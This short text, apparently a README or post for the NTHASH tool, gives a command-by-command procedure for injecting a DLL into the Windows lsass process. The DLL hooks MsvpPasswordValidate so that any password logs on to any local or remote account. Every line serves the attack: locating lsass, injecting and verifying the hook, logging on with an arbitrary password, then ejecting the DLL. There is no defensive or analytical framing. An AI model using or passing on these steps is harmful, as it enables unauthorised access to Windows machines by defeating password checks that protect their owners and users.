Hook MsvpPasswordValidate, always return 1 and log on with any account (local or remote) and any password.

How to proceed:
Lets retrieve the pid of lsass : nthash-win64 /enumproc | findstr lsass
NTHASH-win64.exe /inject /pid:808 /binary:c:\temp\hook-win64.dll
optionally, check that our dll as been injected : NTHASH-win64.exe /enummod /pid:808 | findstr hook .
test runas /user:Admin cmd OR log on remotely (provide any password) : you win!
NTHASH-win64.exe /eject /pid:808 /binary:hook-win64.dll
optionally, check that our dll as been ejected : NTHASH-win64.exe /enummod /pid:808 | findstr hook
